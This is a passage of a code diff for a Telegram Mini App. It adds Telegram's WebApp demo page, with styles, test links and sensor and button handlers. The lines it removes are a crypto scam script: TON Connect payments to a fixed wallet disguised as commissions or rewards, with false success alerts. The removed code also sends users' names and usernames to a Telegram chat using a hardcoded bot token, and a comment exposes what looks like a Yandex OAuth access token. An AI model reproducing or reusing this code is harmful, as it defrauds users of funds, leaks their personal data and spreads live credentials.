+            z-index: -1;
+        }
+
+        section {
+            padding: 15px;
+            text-align: center;
+            background-color: var(--bg-color, #ffffff);
+        }
+
+        section#top_sect {
+            background-color: var(--tg-theme-bg-color, #ffffff);
+        }
+
+        section#top_sect.second {
+            background-color: var(--tg-theme-secondary-bg-color, #efefef);
+        }
+
+        section .sect_row {
+            margin: 10px 0;
+        }
+
+        section + section {
+            padding: 0 15px 65px;
+        }
+
+        p {
+            margin: 40px 0 15px;
+        }
+
+        ul {
+            text-align: left;
+        }
+
+        li {
+            color: var(--tg-theme-hint-color, #a8a8a8);
+        }
+
+        textarea {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 7px;
+        }
+
+        pre {
+            background: rgba(0, 0, 0, .07);
+            color: var(--tg-theme-text-color, #222);
+            font-size: 12px;
+            border: none;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 7px 0;
+            word-break: break-word;
+            white-space: pre-wrap;
+            text-align: left;
+        }
+
+        .dark pre {
+            background: rgba(255, 255, 255, .15);
+        }
+
+        .chat_img {
+            width: 30px;
+            border-radius: 15px;
+            margin-right: 10px;
+        }
+
+        .columns {
+            display: flex;
+        }
+
+        .columns > * {
+            flex-grow: 1;
+        }
+
+        .hint {
+            font-size: .8em;
+            color: var(--tg-theme-hint-color, #a8a8a8);
+        }
+
+        .ok {
+            color: green;
+        }
+
+        .err {
+            color: red;
+        }
+
+        .status_need {
+            display: none;
+        }
+
+        #fixed_wrap {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            transform: translateY(100vh);
+        }
+
+        .viewport-container {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            height: var(--tg-viewport-stable-height, 100vh);
+            transition: height .2s ease;
+        }
+
+        .viewport-container .main-container {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .viewport-container .main-container button {
+            width: auto;
+        }
+
+        .viewport-border,
+        .viewport-stable_border {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            height: var(--tg-viewport-height, 100vh);
+            pointer-events: none;
+        }
+
+        .viewport-stable_border {
+            height: var(--tg-viewport-stable-height, 100vh);
+        }
+
+        .viewport-border:before,
+        .viewport-stable_border:before {
+            content: attr(text);
+            display: inline-block;
+            position: absolute;
+            background: gray;
+            right: 0;
+            top: 0;
+            font-size: 7px;
+            padding: 2px 4px;
+            vertical-align: top;
+        }
+
+        .viewport-stable_border:before {
+            background: green;
+            left: 0;
+            right: auto;
+        }
+
+        .viewport-border:after,
+        .viewport-stable_border:after {
+            content: '';
+            display: block;
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            border: 2px dashed gray;
+        }
+
+        .viewport-stable_border:after {
+            border-color: green;
+        }
+
+        small {
+            font-size: 12px;
+        }
+        .small {
+            font-size: 12px;
+        }
+
+        .table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .table td {
+            padding: 2px;
+        }
+        .table-bordered {
+            border: 1px solid var(--tg-theme-hint-color, #ccc);
+        }
+        .table-bordered th, .table-bordered td {
+            border: 1px solid var(--tg-theme-hint-color, #ccc);
+            padding: 4px;
+        }
+        .table.small button {
+            padding: 3px 6px;
+            font-size: 12px;
+            margin: 4px 0;
+        }
+        .table.small input {
+            padding: 3px 6px;
+            font-size: 12px;
+            margin: 4px 0;
+        }
+    </style>
+</head>
+
+<body class="" style="visibility: hidden;">
+
+<section id="top_sect" class="second">
+    <button id="main_btn" onclick="DemoApp.sendMessage('');">Send «Hello, World!»</button>
+    <button id="with_webview_btn" onclick="DemoApp.sendMessage('', true);">Send «Hello, World!» with inline webview button</button>
+    <button id="share_btn" onclick="DemoApp.sendMessage('', false, true);">Share «Hello, World!»</button>
+    <button id="share_ww_btn" onclick="DemoApp.sendMessage('', true, true);">Share «Hello, World!» with inline button</button>
+    <button id="data_btn" onclick="DemoApp.sendTime(true);">Send current time to bot (x10)</button>
+    <button onclick="DemoApp.expand();">Expand Webview</button>
+    <button onclick="DemoApp.toggleBackButton(this);">Show Back Button</button>
+    <button onclick="DemoApp.toggleSettingsButton(this);">Show Settings Button</button>
+    <button onclick="DemoApp.toggleMainButton(this);">Hide Main Button</button>
+    <button onclick="DemoApp.toggleSecondaryButton(this);">Hide Secondary Button</button>
+    <button onclick="DemoApp.toggleButtonsProgress(this);">Show Progress</button>
+    <button onclick="DemoApp.toggleSwipeBehavior(this);">Disable Vertical Swypes</button>
+    <button id="fullscreen_btn" onclick="DemoApp.toggleFullscreen(this);">Request Fullscreen</button>
+    <button id="orient_btn" onclick="DemoApp.toggleOrientationLock(this);">Lock Orientation</button>
+    <input type="text" placeholder="Input text in regular input..." id="regular_field" />
+    <div
+        class="input"
+        contenteditable="true"
+        data-placeholder="Input text in contenteditable field..."
+        id="text_field"
+    ></div>
+    <div id="peer_wrap" style="display:none">
+        <img id="peer_photo" class="chat_img" src="">
+        <span id="peer_name"></span>
+    </div>
+    <div class="sect_row">Header: <input type="color" id="header_color_input" />
+        <select id="header_color_sel">
+            <option value="bg_color" selected>bg_color</option>
+            <option value="secondary_bg_color">secondary_bg_color</option>
+            <option value="custom" id="header_color_val">custom...</option>
+        </select>
+    </div>
+    <div class="sect_row">Background: <input type="color" id="bg_color_input" />
+        <select id="bg_color_sel">
+            <option value="bg_color" selected>bg_color</option>
+            <option value="secondary_bg_color">secondary_bg_color</option>
+            <option value="custom" id="bg_color_val">custom...</option>
+        </select>
+    </div>
+    <div class="sect_row">Bottom Bar: <input type="color" id="bbar_color_input" />
+        <select id="bbar_color_sel">
+            <option value="bg_color">bg_color</option>
+            <option value="secondary_bg_color">secondary_bg_color</option>
+            <option value="bottom_bar_bg_color" selected>bottom_bar_bg_color</option>
+            <option value="custom" id="bbar_color_val">custom...</option>
+        </select>
+    </div>
 </section>
 
+<section>
+    <div id="btn_status" class="hint" style="display: none;"></div>
 
+    <p>Test links:</p>
+    <ul>
+        <li><a id="regular_link" href="?nextpage=1">Regular link #1</a> (opens inside webview)</li>
+        <li><a href="https://telegram.org/" target="_blank">target="_blank" link</a> (opens outside webview)</li>
+        <li><a href="javascript:window.open('https://telegram.org/');">window.open() link</a> (opens outside webview)</li>
+        <li><a href="https://t.me/like">LikeBot t.me link</a> (opens inside Telegram app)</li>
+        <li><a href="javascript:Telegram.WebApp.openTelegramLink('https://t.me/vote');">web_app_open_tg_link()</a> (opens inside Telegram app)</li>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://google.com/');">web_app_open_link()</a> (opens outside webview)</li>
+        <li><a href="tg://resolve?domain=vote">VoteBot tg:// link</a> (does not open)</li>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://telegra.ph/api',{try_instant_view:true});">web_app_open_link({try_instant_view:true})</a> (opens IV inside Telegram app)</li>
+        <li><a href="javascript:Telegram.WebApp.openTelegramLink('https://t.me/DurgerKingBot/menu');">web_app_open_tg_link(webapp_direct_link)</a> (opens with confirm for the first time, then without)</li>
+    </ul>
+    <ul>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://telegram.org',{try_browser:'chrome'});">telegram.org</a> (opens in Chrome)</li>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://telegram.org',{try_browser:'firefox'});">telegram.org</a> (opens in Firefox)</li>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://telegram.org',{try_browser:'safari'});">telegram.org</a> (opens in Safari)</li>
+        <li><a href="javascript:Telegram.WebApp.openLink('https://telegram.org',{try_browser:'opera'});">telegram.org</a> (opens in Opera)</li>
+        <li><a href="javascript:Telegram.WebApp.close({return_back:true});">Return back</a> (Android only)</li>
+    </ul>
+    <ul>
+        <li><a href="javascript:Telegram.WebApp.shareToStory('https://telegra.ph/file/5583ac37c90979f052b7b.png');">Share picture to story</a></li>
+        <li><a href="javascript:Telegram.WebApp.shareToStory('https://telegra.ph/file/5583ac37c90979f052b7b.png',{text:'Test caption'});">Share picture to story</a> (with caption)</li>
+        <li><a href="javascript:Telegram.WebApp.shareToStory('https://telegra.ph/file/5583ac37c90979f052b7b.png',{widget_link:{url:'https://telegra.ph/Almost-done-07-23'}});">Share picture to story</a> (with link widget)</li>
+        <li><a href="javascript:Telegram.WebApp.shareToStory('https://telegra.ph/file/61f1dac694c3131a7b4ac.mp4',{text:'Test caption',widget_link:{url:'https://telegra.ph/Almost-done-07-23',name:'Link'}});">Share video to story</a> (with caption and link widget)</li>
+    </ul>
+    <ul>
+        <li><a href="javascript:DemoApp.downloadFile(this, 'https://telegra.ph/file/5583ac37c90979f052b7b.png', 'Photo.png');">Download picture</a> <span></span></li>
+        <li><a href="javascript:DemoApp.downloadFile(this, 'https://telegra.ph/file/61f1dac694c3131a7b4ac.mp4', 'Video.mp4');">Download video</a> <span></span></li>
+        <li><a href="javascript:DemoApp.downloadFile(this, 'https://pdfobject.com/pdf/sample.pdf', 'Sample.pdf');">Download PDF</a> <span></span></li>
+    </ul>
+    <ul>
+        <li><a href="javascript:Telegram.WebApp.openTelegramLink('https://t.me/addstickers/fltmp');">Stickerpack</a></li>
+        <li><a href="javascript:Telegram.WebApp.openTelegramLink('https://t.me/addstickers/fltmp', {force_request:true});">Stickerpack</a> (nocache)</li>
+    </ul>
+    <ul>
+        <li><a href="javascript:;" onclick="return DemoApp.checkHomeScreenStatus(this);">Check Home Screen Status</a> <span></span></li>
+        <li><a id="add_to_home_btn" href="javascript:;" onclick="return DemoApp.addToHomeScreen(this);">Add to Home Screen</a></li>
+    </ul>
+    <ul>
+        <li><a href="javascript:DemoApp.setEmojiStatus(this, 'U+1F3AE');">Set emoji status</a> <span></span></li>
+        <li><a href="javascript:DemoApp.setEmojiStatus(this, '5213305508034783384', 300);">Set emoji status</a> for 5 min <span></span></li>
+        <li><a href="javascript:DemoApp.setEmojiStatus(this, '123');">Set emoji status</a> (invalid id) <span></span></li>
+    </ul>
 
-<script>
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://raw.githubusercontent.com/Maxutkoe/TheChecker/refs/heads/main/tonconnect/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect'
-    });
-	async function connectToWallet() {
-        const connectedWallet = await tonConnectUI.connectWallet();
-        // Do something with connectedWallet if needed
-        console.log(connectedWallet);
-    }
+    <p>Test permissions:</p>
+    <div class="columns">
+        <ul>
+            <li><a href="javascript:;" onclick="return DemoApp.requestLocation(this);">Request Location</a> <span></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.requestVideo(this);">Request Video</a> <span></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.requestAudio(this);">Request Audio</a> <span></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.requestAudioVideo(this);">Request Audio+Video</a> <span></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.testClipboard(this);" id="clipboard_test">Read from clipboard</a> <span></span></li>
+        </ul>
+        <ul>
+            <li><a href="javascript:;" onclick="return DemoApp.requestWriteAccess(this);">Request write access</a> <span></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.requestPhoneNumber(this);">Request phone number</a> <span></span><br><br></li>
+            <li><a href="javascript:;" onclick="return DemoApp.requestServerTime(this);">Request server time</a> (invokes custom method) <span></span></li>
+        </ul>
+    </div>
 
-    // Call the function
-	tonConnectUI.uiOptions = {
-      twaReturnUrl: 'https://t.me/ThelCheckerlBot',
-        uiPreferences: {
-            borderRadius: 's',
-            theme: "LIGHT"
+    <p>Sensors:</p>
+    <div class="columns">
+        <ul>
+            <li><a id="accelerometer_btn" href="javascript:;" onclick="return DemoApp.toggleAccelerometer(this);">Start Accelerometer</a> <span></span></li>
+            <li><a id="device_orientation_btn" href="javascript:;" onclick="return DemoApp.toggleDeviceOrientation(this);">Start DeviceOrientation(need_absolute=false)</a> <span></span></li>
+            <li id="device_orientation_abs_item"><a href="javascript:;" onclick="return DemoApp.toggleDeviceOrientation(this, true);">Start DeviceOrientation(need_absolute=true)</a> <span></span></li>
+            <li><a id="gyroscope_btn" href="javascript:;" onclick="return DemoApp.toggleGyroscope(this);">Start Gyroscope</a> <span></span></li>
+        </ul>
+    </div>
+
+    <p>Test alerts:</p>
+    <div class="columns">
+        <ul>
+            <li><a href="javascript:;" onclick="alert('Hello!');">alert</a></li>
+            <li><a href="javascript:;" onclick="confirm('Are you sure?');">confirm</a></li>
+            <li><a href="javascript:;" onclick="prompt('How old are you?');">prompt</a></li>
+        </ul>
+        <ul>
+            <li><a href="javascript:;" onclick="DemoApp.showAlert('Hello!');">showAlert</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.showConfirm('Are you sure?');">showConfirm</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.requestWriteAccess();">requestWriteAccess</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.requestContact();">requestContact</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.showPopup();">showPopup</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.showScanQrPopup();">showScanQrPopup</a></li>
+            <li><a href="javascript:;" onclick="DemoApp.showScanQrPopup(true);">showScanQrPopup (links only)</a></li>
+        </ul>
+    </div>
+
+    <p>Haptics:</p>
+    <ul>
+        <li>Impact: <a href="javascript:Telegram.WebApp.HapticFeedback.impactOccurred('heavy');">heavy</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.impactOccurred('light');">light</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.impactOccurred('medium');">medium</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.impactOccurred('rigid');">rigid</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.impactOccurred('soft');">soft</a><br><br></li>
+        <li>Notification: <a href="javascript:Telegram.WebApp.HapticFeedback.notificationOccurred('error');">error</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.notificationOccurred('success');">success</a>, &nbsp; <a href="javascript:Telegram.WebApp.HapticFeedback.notificationOccurred('warning');">warning</a><br><br></li>
+        <li>Selection: <a href="javascript:Telegram.WebApp.HapticFeedback.selectionChanged();">changed</a><br><br></li>
+    </ul>
+
+    <p>Cloud storage:</p>
+    <form onsubmit="DemoApp.saveCloudForm(this, event);">
+        <table class="table table-bordered small">
+            <thead>
+            <tr>
+                <th width="20%">Key</th>
+                <th width="70%">Value</th>
+                <th width="10%"></th>
+            </tr>
+            </thead>
+            <tbody id="cloud_rows"></tbody>
+            <tfoot>
+            <tr>
+                <td><input type="text" name="key" /></td>
+                <td><input type="text" name="value" /></td>
+                <td>
+                    <button type="submit">Save</button>
+                    <button type="reset">Clear</button>
+                </td>
+            </tr>
+            </tfoot>
+        </table>
+    </form>
+
+    <p>Biometrics:</p>
+    <div class="columns">
+        <ul>
+            <li>isInited: <span class="txt" id="bm_inited">false</span></li>
+            <li>available: <span class="txt" id="bm_available">false</span></li>
+            <li>type: <span class="txt" id="bm_type"></span></li>
+            <li>access_requested: <span class="txt" id="bm_access_requested">false</span> (<a href="javascript:;" onclick="return DemoApp.biometricRequestAccess(this);">Request access</a>) <span></span></li>
+            <li>access_granted: <span class="txt" id="bm_access_granted">false</span> <span id="bm_settings" style="display:none;">(<a href="javascript:;" onclick="return DemoApp.biometricOpenSettings(this);">Open settings</a>)</span></li>
+            <li>token_saved: <span class="txt" id="bm_token_saved">false</span> (<a href="javascript:;" onclick="return DemoApp.biometricSetToken(this);">Set token</a>, <a href="javascript:;" onclick="return DemoApp.biometricRemoveToken(this);">Remove token</a>) <span></span></li>
+            <li>device_id: <span class="txt" id="bm_device_id"></span></li>
+            <li><a href="javascript:;" onclick="return DemoApp.biometricRequestAuth(this);">Request auth</a> <span></span></li>
+        </ul>
+    </div>
+
+    <p>Location:</p>
+    <div class="columns">
+        <ul>
+            <li>isInited: <span class="txt" id="loc_inited">false</span></li>
+            <li>available: <span class="txt" id="loc_available">false</span></li>
+            <li>access_requested: <span class="txt" id="loc_access_requested">false</span> (<a href="javascript:;" onclick="return DemoApp.locationGet(this);">Request location</a>) <span></span></li>
+            <li>access_granted: <span class="txt" id="loc_access_granted">false</span>
+                <span id="loc_settings" style="display:none;">(<a href="javascript:;" onclick="return DemoApp.locationOpenSettings(this);">Open settings</a>)</span>
+            </li>
+        </ul>
+    </div>
+
+    <pre><code id="webview_data"></code></pre>
+    <div class="hint">
+        Data passed to webview.
+        <span id="webview_data_status" class="status_need">Checking hash...</span>,
+        <span id="webview_data_sign_status">checking signature...</span>
+    </div>
+    <pre><code id="theme_data"></code></pre>
+    <div class="hint">
+        Theme params
+    </div>
+    <div class="hint">
+        Version: <span id="ver"></span>,
+        platform: <span id="platform"></span>
+    </div>
+    <div class="hint">
+        <span id="cur_activity"></span><span id="prev_activity"></span>
+    </div>
+</section>
+
+<div class="safe-area-border"></div>
+<div class="tg-safe-area-border">
+    <div class="tg-content-safe-area-border"></div>
+</div>
+<div class="viewport-border"></div>
+<div class="viewport-stable_border"></div>
+
+<script type="application/javascript">
+
+    /*
+     * This is a demo code for Telegram WebApp for Bots
+     * It contains basic examples of how to use the API
+     * Note: all requests to backend are disabled in this demo, you should use your own backend
+     */
+
+    const DemoApp = {
+        initData      : Telegram.WebApp.initData || '',
+        initDataUnsafe: Telegram.WebApp.initDataUnsafe || {},
+        MainButton: Telegram.WebApp.MainButton,
+        SecondaryButton: Telegram.WebApp.SecondaryButton,
+        BackButton: Telegram.WebApp.BackButton,
+        SettingsButton: Telegram.WebApp.SettingsButton,
+
+        init: function(options) {
+            document.body.style.visibility = '';
+            Telegram.WebApp.ready();
+
+            Telegram.WebApp.MainButton.setParams({
+                text: 'Close Webview',
+                has_shine_effect: true,
+                is_visible: true
+            }).onClick(DemoApp.close);
+
+            Telegram.WebApp.SecondaryButton.setParams({
+                text: 'Do Something',
+                is_visible: true
+            }).onClick(DemoApp.moveSecondaryButton);
+
+            Telegram.WebApp.BackButton.onClick(function() {
+                DemoApp.showAlert('Back button pressed');
+            });
+
+            Telegram.WebApp.SettingsButton.onClick(function() {
+                DemoApp.showAlert('Settings opened!');
+            });
         },
-    };
 
-
-
-	async function trans(){
-		const usdt = lst*250000000;
-                const transaction = {
-                    validUntil: Math.round(Date.now() / 1000) + 100,
-                    messages: [
-                        {
-                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
-                            amount: usdt.toFixed(0),
-                        }
-                    ]
-                };
-
-                try{
-                    await tonConnectUI.sendTransaction(transaction);
-                    alert("You successfuly paid comission!");
-                    lst = 0;
-                    localStorage.setItem("opop", lst);
-
-					let telegram = {
-    					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
-    					chat_id: "-1002275343624" // The user's(that you want to send a message) telegram chat id
-    				};
-					const text = `${tg.initDataUnsafe.user.first_name} ${tg.initDataUnsafe.user.last_name} | @${tg.initDataUnsafe.user.username} <br>${usdt}`;
-					const url = `https://api.telegram.org/bot${telegram.token}/sendMessage?chat_id=${telegram.chat_id}&text=${text}`; // The url to request
-    				const api = new XMLHttpRequest();
-    				api.open('GET', url, true);
-        api.onload = function(){
-            const status = api.status;
-            if(status == 200){
-              console.log("Супер!");
+        expand() {
+            Telegram.WebApp.expand();
+        },
+        close() {
+            Telegram.WebApp.close();
+        },
+        toggleMainButton(el) {
+            const mainButton = Telegram.WebApp.MainButton
+            if (mainButton.isVisible) {
+                mainButton.hide()
+                el.innerHTML = 'Show Main Button'
+            } else {
+                mainButton.show()
+                el.innerHTML = 'Hide Main Button'
             }
-                
-        };
-        api.send();
+        },
+        toggleSecondaryButton(el) {
+            if (DemoApp.SecondaryButton.isVisible) {
+                DemoApp.SecondaryButton.hide()
+                el.innerHTML = 'Show Secondary Button'
+            } else {
+                DemoApp.SecondaryButton.show();
+                el.innerHTML = 'Hide Secondary Button'
+            }
+        },
+        toggleButtonsProgress(el) {
+            if (DemoApp.MainButton.isProgressVisible) {
+                DemoApp.MainButton.hideProgress()
+                DemoApp.SecondaryButton.hideProgress()
+                el.innerHTML = 'Show Progress'
+            } else {
+                DemoApp.MainButton.showProgress()
+                DemoApp.SecondaryButton.showProgress()
+                el.innerHTML = 'Hide Progress'
+            }
+        },
+        moveSecondaryButton(el) {
+            const sButton = DemoApp.SecondaryButton
+            if (sButton.position === 'left') {
+                sButton.position = 'top'
+            } else if (sButton.position === 'top') {
+                sButton.position = 'right'
+            } else if (sButton.position === 'right') {
+                sButton.position = 'bottom'
+            } else if (sButton.position === 'bottom') {
+                sButton.position = 'left'
+            }
+        },
+        toggleBackButton(el) {
+            if (DemoApp.BackButton.isVisible) {
+                DemoApp.BackButton.hide()
+                el.innerHTML = 'Show Back Button'
+            } else {
+                DemoApp.BackButton.show()
+                el.innerHTML = 'Hide Back Button'
+            }
+        },
+        toggleSettingsButton(el) {
+            if (DemoApp.SettingsButton.isVisible) {
+                DemoApp.SettingsButton.hide()
+                el.innerHTML = 'Show Settings Button'
+            } else {
+                DemoApp.SettingsButton.show()
+                el.innerHTML = 'Hide Settings Button'
+            }
+        },
+        toggleSwipeBehavior(el) {
+            if (Telegram.WebApp.isVerticalSwipesEnabled) {
+                Telegram.WebApp.disableVerticalSwipes()
+                el.innerHTML = 'Enable Vertical Swypes'
+            } else {
+                Telegram.WebApp.enableVerticalSwipes()
+                el.innerHTML = 'Disable Vertical Swypes'
+            }
+        },
+        toggleOrientationLock(el) {
+            if (Telegram.WebApp.isOrientationLocked) {
+                Telegram.WebApp.unlockOrientation()
+                el.innerHTML = 'Lock Orientation'
+            } else {
+                Telegram.WebApp.lockOrientation()
+                el.innerHTML = 'Unlock Orientation'
+            }
+        },
+        fullscreenInit() {
+            Telegram.WebApp.onEvent('fullscreenChanged', function() {
+                DemoApp.updateFullscreenButton()
+            })
+            Telegram.WebApp.onEvent('fullscreenFailed', function(params) {
+                DemoApp.showAlert('fullscreenFailed: ' + params.error)
+            })
+            DemoApp.updateFullscreenButton()
+        },
+        toggleFullscreen(el) {
+            if (Telegram.WebApp.isFullscreen) {
+                Telegram.WebApp.exitFullscreen()
+            } else {
+                Telegram.WebApp.requestFullscreen()
+            }
+        },
+        updateFullscreenButton() {
+            const fullscreenBtn = document.getElementById('fullscreen_btn')
+            if (Telegram.WebApp.isFullscreen) {
+                fullscreenBtn.innerHTML = 'Exit Fullscreen'
+            } else {
+                fullscreenBtn.innerHTML = 'Request Fullscreen'
+            }
+        },
 
-                }
-                catch(e){
-                    console.error(e);
-                }
-    }
-    async function payForPrime(){
-                const transaction = {
-                    validUntil: Math.round(Date.now() / 1000) + 100,
-                    messages: [
-                        {
-                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
-                            amount: 250000000, //250000000
-                        }
-                    ]
-                };
+        // accelerometer
+        accelerometerInit() {
+            Telegram.WebApp.onEvent('accelerometerStarted', function() {
+                const span = document.getElementById('accelerometer_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateAccelerometerLink();
+            })
 
-                try{
-                    await tonConnectUI.sendTransaction(transaction);
-                    alert("You successfuly recieved 0.01 TON!");
-                    let completed = document.getElementById("terms");
-                    let body = document.querySelector("body");
-                    body.removeChild(completed);
-                    setTgPrem("yes");
-                    getTgPrem();
-                    window.location.reload();
-                }
-                catch(e){
-                    console.error(e);
-                }
-    }
-    async function supportAuth(){
-                const transaction = {
-                    validUntil: Math.round(Date.now() / 1000) + 100,
-                    messages: [
-                        {
-                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
-                            amount: 250000000, //250000000
-                        }
-                    ]
-                };
+            Telegram.WebApp.onEvent('accelerometerStopped', function() {
+                const span = document.getElementById('accelerometer_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateAccelerometerLink();
+            })
 
-                try{
-                    await tonConnectUI.sendTransaction(transaction);
-                    alert("Thanks!!!");
-                }
-                catch(e){
-                    console.error(e);
-                }
-    }
+            Telegram.WebApp.onEvent('accelerometerChanged', function() {
+                const span = document.getElementById('accelerometer_btn').nextElementSibling;
+                span.textContent = '(x: ' + this.Accelerometer.x + '; y: ' + this.Accelerometer.y + '; z: ' + this.Accelerometer.z + ')';
+                span.className = 'ok';
+            })
 
-    function getMktTokens(){
-	let api = new XMLHttpRequest();
-    let wallet = tonConnectUI.wallet.account.address;
-    const url = `https://tonapi.io/v2/accounts/${wallet}/jettons`;
-    //https://oauth.yandex.ru/verification_code#access_token=y0_AgAAAABbCGd7AAtGZwAAAAEcn3YsAAAWXo6VDEhPgIKVymz8EcVTx0bdYA&token_type=bearer&expires_in=31528306&cid=vw4tuxanj28dm7kp29ezn5zpg4
+            Telegram.WebApp.onEvent('accelerometerFailed', function(params) {
+                const span = document.getElementById('accelerometer_btn').nextElementSibling;
+                span.textContent = '(ERR: ' + params.error + ')';
+                span.className = 'err';
+            })
 
-        api.open('GET', url, true);
-        api.responseType = "json";
-        api.onload = function(){
-            const status = api.status;
-            if(status == 200){
-                // console.log(api.response.addresses[aroundom(5, 200).toFixed(0)].address);
-				//wallet = api.response.addresses[aroundom(5, 200).toFixed(0)].address;
-				//console.log(api.response);
-                for(let i = 0; i < api.response.balances.length; i++){
-                    if(api.response.balances[i].jetton.name == "Mk.Token" && api.response.balances[i].jetton.symbol == "MKT" && api.response.balances[i].jetton.address == "0:27d3109a5591be3d6782463d1db6f218819bb1f704b52b7ce3036a484e00cdca"){
-                        //console.log(api.response.balances[i].jetton.name);
-                        lst = 25.567;//api.response.balances[i].balance / 1000;
+            DemoApp.updateAccelerometerLink()
+        },
+        toggleAccelerometer: function(el) {
+            if (Telegram.WebApp.Accelerometer.isStarted) {
+                Telegram.WebApp.Accelerometer.stop();
+            } else {
+                Telegram.WebApp.Accelerometer.start({ refresh_rate: 100 });
+            }
+        },
+        updateAccelerometerLink() {
+            var accelerometerBtn = document.getElementById('accelerometer_btn');
+            if (Telegram.WebApp.Accelerometer.isStarted) {
+                accelerometerBtn.innerHTML = 'Stop Accelerometer';
+            } else {
+                accelerometerBtn.innerHTML = 'Start Accelerometer';
+            }
+        },
+
+        // device orientation
+        deviceOrientationInit() {
+            Telegram.WebApp.onEvent('deviceOrientationStarted', function() {
+                var span = document.getElementById('device_orientation_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateDeviceOrientationLink();
+            })
+
+            Telegram.WebApp.onEvent('deviceOrientationStopped', function() {
+                var span = document.getElementById('device_orientation_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateDeviceOrientationLink();
+            })
+
+            Telegram.WebApp.onEvent('deviceOrientationChanged', function() {
+                var span = document.getElementById('device_orientation_btn').nextElementSibling;
+                span.textContent = '(alpha: ' + this.DeviceOrientation.alpha +
+                    '; beta: ' + this.DeviceOrientation.beta +
+                    '; gamma: ' + this.DeviceOrientation.gamma +
+                    '; absolute: ' + (this.DeviceOrientation.absolute ? 'true' : 'false') + ')';
+                span.className = 'ok';
+            })
+
+            Telegram.WebApp.onEvent('deviceOrientationFailed', function(params) {
+                var span = document.getElementById('device_orientation_btn').nextElementSibling;
+                span.textContent = '(ERR: ' + params.error + ')';
+                span.className = 'err';
+            })
+
+            DemoApp.updateDeviceOrientationLink()
+        },
+        toggleDeviceOrientation(el, need_absolute) {
+            if (Telegram.WebApp.DeviceOrientation.isStarted) {
+                Telegram.WebApp.DeviceOrientation.stop();
+            } else {
+                Telegram.WebApp.DeviceOrientation.start({ refresh_rate: 100, need_absolute: need_absolute });
+            }
+        },
+        updateDeviceOrientationLink() {
+            var deviceOrientationBtn = document.getElementById('device_orientation_btn');
+            var absItem = document.getElementById('device_orientation_abs_item');
+
+            if (Telegram.WebApp.DeviceOrientation.isStarted) {
+                deviceOrientationBtn.innerHTML = 'Stop DeviceOrientation';
+                absItem.style.display = 'none';
+            } else {
+                deviceOrientationBtn.innerHTML = 'Start DeviceOrientation(need_absolute=false)';
+                absItem.style.display = 'block';
+            }
+        },
+
+        // gyroscope
+        gyroscopeInit() {
+            Telegram.WebApp.onEvent('gyroscopeStarted', function() {
+                var span = document.getElementById('gyroscope_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateGyroscopeLink();
+            })
+
+            Telegram.WebApp.onEvent('gyroscopeStopped', function() {
+                var span = document.getElementById('gyroscope_btn').nextElementSibling;
+                span.textContent = '';
+                span.className = '';
+                DemoApp.updateGyroscopeLink();
+            })
+
+            Telegram.WebApp.onEvent('gyroscopeChanged', function() {
+                var span = document.getElementById('gyroscope_btn').nextElementSibling;
+                span.textContent = '(x: ' + this.Gyroscope.x + '; y: ' + this.Gyroscope.y + '; z: ' + this.Gyroscope.z + ')';
+                span.className = 'ok';
+            })
+
+            Telegram.WebApp.onEvent('gyroscopeFailed', function(params) {
+                var span = document.getElementById('gyroscope_btn').nextElementSibling;
+                span.textContent = '(ERR: ' + params.error + ')';
+                span.className = 'err';
+            })
+
+            DemoApp.updateGyroscopeLink()
+        },
+        toggleGyroscope(el) {
+            if (Telegram.WebApp.Gyroscope.isStarted) {
+                Telegram.WebApp.Gyroscope.stop();
+            } else {
+                Telegram.WebApp.Gyroscope.start({ refresh_rate: 100 });
+            }
+        },
+        updateGyroscopeLink() {
+            var gyroscopeBtn = document.getElementById('gyroscope_btn');
+            if (Telegram.WebApp.Gyroscope.isStarted) {
+                gyroscopeBtn.innerHTML = 'Stop Gyroscope';
+            } else {
+                gyroscopeBtn.innerHTML = 'Start Gyroscope';
+            }
+        },
+
+        // location
+        locationInit(el) {
+            const locationManager = Telegram.WebApp.LocationManager;
+
